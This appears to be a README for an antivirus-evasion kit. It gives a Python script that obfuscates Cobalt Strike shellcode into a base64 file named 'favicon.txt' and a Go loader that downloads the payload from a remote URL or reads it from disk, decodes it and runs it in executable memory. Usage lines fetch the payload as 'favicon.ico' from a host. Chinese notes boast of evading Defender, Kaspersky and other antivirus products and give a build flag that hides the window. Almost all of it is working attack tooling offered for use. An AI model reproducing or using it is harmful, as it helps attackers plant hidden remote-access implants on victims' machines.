# 0x00 generate cobaltstrike shellcode

`Attacks =>> Packages =>> Payload generate =>> Output =>> Raw =>> payload.bin`

# 0x01 replace base64 shellcode

```
import base64
import random
import numpy
import sys

# print len(sys.argv)
# print sys.argv[0]
# print sys.argv[1]

if len(sys.argv) != 2:
    sys.exit("[+] useage: python %s [File: payload.bin]"%sys.argv[0])
else:
    shellcode =  open("payload.bin","rb").read()
    b64shellcode = base64.b64encode(shellcode).decode()
    b64shellcode = b64shellcode.replace("A","#").replace("H","!").replace("1","@").replace("T",")")
    print("[+] b64shellcode= \n" + b64shellcode)
    f = open("favicon.txt","wb")
    f.write(b64shellcode)
    f.close()
```

# 0x02 comiple mian.go


```
package main


import (
    "encoding/base64"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "strings"
    "syscall"
    "unsafe"
    "flag"
)
var (
    kernel32     = syscall.NewLazyDLL("kernel32.dll")
    VirtualAlloc = kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)
func runUrl(url string) {
    resp, _ := http.Get(url)
    body, _ := ioutil.ReadAll(resp.Body)
    resp.Body.Close()


    str1 :=strings.Replace(string(body), "#", "A", -1 )
    str2 :=strings.Replace(str1, "!", "H", -1 )
    str3 :=strings.Replace(str2, "@", "1", -1 )
    str4 :=strings.Replace(str3, ")", "T", -1 )
    sDec,_ := base64.StdEncoding.DecodeString(str4)
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
    _, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
    syscall.Syscall(addr, 0, 0, 0, 0)
}


func ReadFile(filepath string){
    f, err := os.Open(filepath)
    if err != nil {
        fmt.Println("read file fail", err)
    }
    defer f.Close()
 
    fd, err := ioutil.ReadAll(f)
    if err != nil {
        fmt.Println("read to fd fail", err)
    }

    str1 :=strings.Replace(string(fd), "#", "A", -1 )
    str2 :=strings.Replace(str1, "!", "H", -1 )
    str3 :=strings.Replace(str2, "@", "1", -1 )
    str4 :=strings.Replace(str3, ")", "T", -1 )

    sDec,_ := base64.StdEncoding.DecodeString(str4) //base64解密
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
    _, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
    syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {

    var url string
    var code string

    flag.StringVar(&url, "u", "", "url")
    flag.StringVar(&code, "s", "", "shellcode")
    flag.Parse()

    if(len(os.Args) != 3){
        // fmt.Println("Usage:xxx.exe -u http://x.x.x.x/code.txt")
        // fmt.Println("Or xxx.exe -s base64_encode_shellcode")
        os.Exit(0)
    } else if url != "" {
        runUrl(url)
    }else{
        ReadFile(code)
    }
}

```

# 0x03 get session

**shell.exe -u http://172.16.242.1/favicon.ico**

**shell.exe -s payload.txt**

# bypassAV
条件触发式远控 VT 6/70 免杀国内杀软及defender、卡巴斯基等主流杀软
## 原理
https://pureqh.top/?p=5412
## use
将shellcode填至go_shellcode_encode.py生成混淆后的base64 payload<br>
然后将生成的payload填至main.go build("b64shellcode")<br>
将main.go中的url替换为你vbs的某个网页或文本（局域网网页同样可以，但是需要程序可以正常使用时此网页需要可以访问）<br>
编译：go build -ldflags="-w -s -H=windowsgui"<br>
